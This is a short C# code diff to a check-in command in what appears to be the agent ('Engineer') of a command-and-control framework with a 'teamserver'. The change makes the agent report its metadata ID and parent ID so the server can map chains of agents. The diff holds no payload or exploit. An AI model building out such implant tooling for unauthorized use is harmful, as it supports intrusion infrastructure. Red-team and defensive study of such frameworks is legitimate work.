@@ -15,8 +15,9 @@ namespace Engineer.Commands
 
         public override async Task Execute(EngineerTask task)
         {
-            Console.WriteLine(" doing check in");
-            Tasking.FillTaskResults("checking in",task,EngTaskStatus.Complete);
+            //Console.WriteLine("Checking In");
+            task.Arguments.TryGetValue("/parentid", out string parentId);
+            Tasking.FillTaskResults(Program._metadata.Id+"\n" + parentId,task,EngTaskStatus.Complete); //gives back the engineers metadata and the parent so the teamserver can make the path
         }
     }
 }
